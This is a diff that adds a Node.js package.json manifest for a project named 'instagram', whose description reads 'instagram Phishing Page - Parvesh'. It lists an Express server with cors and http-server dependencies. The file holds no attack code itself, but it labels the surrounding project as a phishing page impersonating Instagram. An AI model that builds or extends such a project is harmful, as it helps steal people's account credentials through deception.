@@ -1,0 +1,18 @@
+{
+  "name": "instagram",
+  "version": "1.0.0",
+  "description": "instagram Phishing Page - Parvesh",
+  "main": "server.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "start": "node server.js"
+  },
+  "author": "",
+  "license": "ISC",
+  "dependencies": {
+    "cors": "^2.8.5",
+    "express": "^4.19.2",
+    "http-server": "^14.1.1",
+    "path": "^0.12.7"
+  }
+}
